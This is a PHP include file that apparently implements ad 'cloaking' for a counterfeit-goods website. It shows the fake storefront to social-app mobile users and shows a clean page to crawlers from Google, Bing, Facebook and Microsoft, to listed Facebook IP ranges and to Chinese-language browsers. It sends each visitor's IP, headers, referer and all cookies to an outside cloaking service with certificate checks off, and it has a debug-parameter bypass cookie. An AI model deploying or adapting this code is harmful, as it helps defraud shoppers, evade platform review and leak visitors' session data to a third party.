<?php
if($_GET['debug'] == 'zp') {
    setcookie("CUYT", "uu90929833", time()+36000);
    echo "<script>setTimeout(\"window.location.href='//" . $_SERVER['SERVER_NAME'] . "'\", 1);</script>";
    exit;
}

 include("ip_check_config.php");
 //-----------------------------------------------ip check bof-----------------------------------------------


require("page_8.php");
	//指定ip显示仿品
// 	$ips_fp_ary = explode(",",SHOW_SITE_IP);
	//判断ip
// 	$client_ip = leichao_get_client_ip();

// 	if(SHOW_SITE_MODE_SWITCH == "zp")
// 	{
// 		  $is_fp = 0;
// 	}
// 	elseif(SHOW_SITE_MODE_SWITCH == "ip_check")
// 	{
// 		  if(in_array($client_ip, $ips_fp_ary) || result_ip_check())
// 		  {

// 			  $is_fp = 1;
// 		  }
// 		  else {
// 			  $is_fp = 0;
// 		  }

// 	}
// 	elseif(SHOW_SITE_MODE_SWITCH == "fp")
// 	{
// 		  $is_fp = 1;
// 	}
//   if($is_fp == 1)
//   {
      
          
//   }

 //-----------------------------------------------ip check eof-----------------------------------------------

function print_html($load_file_name)
{
   $f_open=file_get_contents($load_file_name);
   echo $f_open;
   exit();
}

function result_ip_check()
{
	$res_fig = false;
	if(SHOW_SITE_CN)
	{
		if(accept_lang_zh())
		{
			return $res_fig;
		}
	}
	/*if(checkrobot())
	{
		return $res_fig;
	}*/
	if(SHOW_SITE_MOBILE)
	{
		if(!ip_check_for_isMobile())	//非手机端访问  显示正品
		{
			return $res_fig;
		}
	}

    $apps = explode(',', APP_IN);
    $inapps = array_intersect(array("facebook", "messenger", "twitter", "line", "wechat", "puffin", "miui", "instagram", "chrome", "safari", "ie", "firefox"), $apps);
    $res = checkAppIn($inapps);

    if( $res )
    {
        return true;
    }
    
	if(SHOW_SITE_OUTPUT)
	{
		if(!yingjia_i3rapp_check())	//非手机端访问  显示正品
		{
			return $res_fig;
		}
	}
	return true;
}

//add by new cloak
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on')
    {
        return TRUE;
    }
    elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
    {
        return TRUE;
    }
    elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on')
    {
        return TRUE;
    }
    return FALSE;
}

function browser_headers()
{
    $headers = array();
    foreach ($_SERVER as $name => $value) {
        if (preg_match('/^HTTP_/', $name)) {
            // convert HTTP_HEADER_NAME to header-name
            $name = strtr(substr($name, 5), '_', '-');
            $name = strtolower($name);
            $headers[$name] = $value;
        }
    }
    return $headers;
}

function encode_visitor_cookies()
{
    $transmit_string = "";

    foreach ($_COOKIE as $name => $value) {
        try {
            $transmit_string .= "$name=$value; ";
        } catch (Exception $e) {
            continue;
        }
    }

    return $transmit_string;
}

function forward_response_cookies($ch, $headerLine)
{
    if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) {
        header($headerLine, false);
    }

    return strlen($headerLine); // Needed by curl
}

function get_SERVER_value($field_name)
{
    return isset($_SERVER[$field_name]) ? $_SERVER[$field_name] : null;
}

//第三方接口 判断ip属性，所属公司  地区
function yingjia_i3rapp_check()
{
    $jsonData = array();                                // 初始化接口发送数据
    if(isset($_COOKIE["CUYT"])) {
        
        $boolean = ($_COOKIE["CUYT"]=='uu90929833')?true:false;
    } else {
        if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {     // 使用cloudflare 转发的IP地址
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } else {
            if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
                $ip = getenv('HTTP_CLIENT_IP');
            } elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
                $ip = getenv('HTTP_X_FORWARDED_FOR');
            } elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
                $ip = getenv('REMOTE_ADDR');
            } elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
        }
        $boolean = true;
        $hostname = gethostbyaddr($ip);
        if (!empty($hostname)) {
            if(is_numeric(stripos($hostname, 'google')) || is_numeric(stripos($hostname, 'bing')) || is_numeric(stripos($hostname, 'facebook')) || is_numeric(stripos($hostname, 'microsoft'))) {
                $boolean = false;
            }
        }
    
        //add by new cloak END
    
        if($boolean) {
            $headers = browser_headers();
        //    $visit_domain = str_replace('www.', '', $_SERVER['HTTP_HOST']);     // 当前网站域名
            $visit_domain = (is_https() ? "https://" : "http://"). $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $jsonData['id'] = CLOAK_AD_ID;
            $jsonData['ip'] = $ip;
            $jsonData['domain'] = $visit_domain;
            $jsonData['country_code'] = SHOW_SITE_COUNTRY;
            $jsonData['referer'] = get_SERVER_value('HTTP_REFERER');
            $jsonData['headers'] = json_encode($headers);
            $ch = curl_init('www.tiktokba.com/cloak/byApi');
    
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
            curl_setopt($ch, CURLOPT_USERAGENT, get_SERVER_value('HTTP_USER_AGENT'));
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    
            curl_setopt($ch, CURLOPT_ENCODING, ""); //Enables compression
            curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-type: application/json"]);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ["escloak-key: " . CLOAK_AUTH_KEY]);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($jsonData));
            curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies"); //Forward response's cookies to visitor
            if ($_COOKIE) {//Forward visitor's cookie to our server
                curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
            }
            $return = curl_exec($ch);
            if($return == false){
                echo 'Curl error: ' . curl_error($ch);exit;
            }
            $return = json_decode($return, true);
            $boolean = $return['result'];           // 返回true 访问仿品，返回false 访问正品
        }
    
        $boolean?setcookie("CUYT", "uu90929833", time()+36000):setcookie("CUYT", "909129833", time()+36000);
    }
    
    return $boolean;
}


//获取客户浏览器语言
function accept_lang_zh()
{
	$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 4);
	if (preg_match("/zh-c/i", $lang))
	{
		return true; 		//not zh-c
	}
	else
	{
		return false; 		//is zh-c
	}
	// 返回false 访问仿品，返回true 访问正品
}


    // 获取IP地址
    function leichao_get_client_ip($type = 0) {
        $type       =  $type ? 1 : 0;
        static $ip  =   NULL;
        if ($ip !== NULL) return $ip[$type];
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $arr    =   explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $pos    =   array_search('unknown',$arr);
            if(false !== $pos) unset($arr[$pos]);
            $ip     =   trim($arr[0]);
        }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ip     =   $_SERVER['HTTP_CLIENT_IP'];
        }elseif (isset($_SERVER['REMOTE_ADDR'])) {
            $ip     =   $_SERVER['REMOTE_ADDR'];
        }
        // IP地址合法验证
        $long = sprintf("%u",ip2long($ip));
        $ip   = $long ? array($ip, $long) : array('0.0.0.0', 0);
        return $ip[$type];
    }

	//判断ip是否为  fb ip
	function is_fb_ip($ip_str)
	{
		$fecebook_ip_array = array('31.13.24.','31.13.64.','31.13.64.','31.13.64.','31.13.65.','31.13.66.','31.13.68.','31.13.69.','31.13.70.','31.13.71.','31.13.72.','31.13.73.','31.13.74.','31.13.75.','31.13.76.','31.13.77.','31.13.79.','31.13.80.','31.13.81.','31.13.82.','31.13.83.','31.13.84.','31.13.85.','31.13.86.','31.13.90.','31.13.91.','31.13.92.','31.13.93.','31.13.95.','31.13.96.','45.64.40.','66.220.144.','66.220.144.','66.220.152.','69.171.224.','69.171.224.','69.171.239.','69.171.240.','69.171.255.','69.63.176.','69.63.176.','69.63.184.','74.119.76.','103.4.96.','129.134.0.','157.240.0.','157.240.189.','157.240.190.','157.240.191.','173.252.64.','173.252.64.','173.252.96.','179.60.192.','185.60.216.','199.201.64.','199.201.64.','199.201.66.','199.201.67.','204.15.20.');

		$ip_3 = substr($ip_str,0,strripos($ip_str,".")+1);		//截取ip的前三段  结果如  69.171.239.

		if(in_array($ip_3, $fecebook_ip_array))
		{
			//echo "is fb ip";
			return true;
		}
		else
		{
			//echo "not fb ip";
			return false;
		}
	}

    // 淘宝API查询国家代码
	function taobao_ip_country($client_ip)
	{
		$url = "http://ip.taobao.com/service/getIpInfo.php?ip=".$client_ip;
		$json = json_decode(file_get_contents($url));
		$country = $json->{"data"}->{"country_id"};

		return $country;
	}

    // geoiptool  API查询国家代码
	function geoiptool_ip_country($client_ip)
	{
		$url = "https://geoiptool.com/en/?ip=".$client_ip;
		$str = file_get_contents($url);
		$str_country = ip_p_substr("Country Code:</span>"," (",$str);

		$str_country = str_replace("<span>","",$str_country);
		$str_country = trim($str_country);

		return $str_country;
	}


	function ip_p_substr($p_bof,$p_eof,$p_str)
	{
		$p_1=explode($p_bof,$p_str);
		$p_e=strpos($p_1[1],$p_eof);
		$p_0=substr($p_1[1],0,$p_e);

		return $p_0;
	}


	/*移动端判断*/
function ip_check_for_isMobile()
{
    // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
    if (isset ($_SERVER['HTTP_X_WAP_PROFILE']))
    {
        return true;
    }
    // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
    if (isset ($_SERVER['HTTP_VIA']))
    {
        // 找不到为flase,否则为true
        return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    }
    // 脑残法，判断手机发送的客户端标志,兼容性有待提高
    if (isset ($_SERVER['HTTP_USER_AGENT']))
    {
        $clientkeywords = array ('nokia',
            'sony',
            'ericsson',
            'mot',
            'samsung',
            'htc',
            'sgh',
            'lg',
            'sharp',
            'sie-',
            'philips',
            'panasonic',
            'alcatel',
            'lenovo',
            'iphone',
            'ipod',
            'blackberry',
            'meizu',
            'android',
            'netfront',
            'symbian',
            'ucweb',
            'windowsce',
            'palm',
            'operamini',
            'operamobi',
            'openwave',
            'nexusone',
            'cldc',
            'midp',
            'wap',
            'mobile'
            );
        // 从HTTP_USER_AGENT中查找手机浏览器的关键字
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT'])))
        {
            return true;
        }
    }
    // 协议法，因为有可能不准确，放到最后判断
    if (isset ($_SERVER['HTTP_ACCEPT']))
    {
        // 如果只支持wml并且不支持html那一定是移动设备
        // 如果支持wml和html但是wml在html之前则是移动设备
        if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html'))))
        {
            return true;
        }
    }
    return false;
}

function checkrobot($useragent=''){
 static $kw_spiders = array('bot', 'crawl', 'spider' ,'slurp', 'sohu-search', 'lycos', 'robozilla');
 static $kw_browsers = array('msie', 'netscape', 'opera', 'konqueror', 'mozilla');

 $useragent = strtolower(empty($useragent) ? $_SERVER['HTTP_USER_AGENT'] : $useragent);
 if(strpos($useragent, 'http://') === false && dstrpos($useragent, $kw_browsers)) return false;
 if(dstrpos($useragent, $kw_spiders)) return true;
 return false;
}

function dstrpos($string, $arr, $returnvalue = false) {
 if(empty($string)) return false;
 foreach((array)$arr as $v) {
 if(strpos($string, $v) !== false) {
 $return = $returnvalue ? $v : true;
 return $return;
 }
 }
 return false;
}

function checkAppIn($YourApp) {
    // if (strpos($_SERVER['HTTP_USER_AGENT'], $YourApp . '/') !== false)
    
    $browserString = array(
      "messenger" => "/\bFB[\w_]+\/(Messenger|MESSENGER)/",
      "facebook" => "/\bFB[\w_]+\//",
      "twitter" => "/\bTwitter/i",
      "line" => "/\bLine\//i",
      "wechat" => "/\bMicroMessenger\//i",
      "puffin" => "/\bPuffin/i",
      "miui" => "/\bMiuiBrowser\//i",
      "instagram" => "/\bInstagram/i",
      "safari" => "/Version.*Mobile.*Safari|Safari.*Mobile|MobileSafari/",
      "ie" => "/IEMobile|MSIEMobile|Edg\/[.0-9]*/",
      "firefox" => "/fennec|firefox.*maemo|(Mobile|Tablet).*Firefox|Firefox.*Mobile|FxiOS/",
      "chrome" => "/Chrome|Chromium|\bCrMo\b|CriOS|Android.*Chrome\/[.0-9]* (Mobile)?/",
    );
    $browserName = 'other';

    foreach($browserString as $bs => $rex) {
        if(preg_match($rex, $_SERVER['HTTP_USER_AGENT'])) {
            $browserName = $bs;
            break;
        }
    }
    
    if(in_array($browserName, $YourApp)) {
        return true;
    }

    return false;
}
        
?>
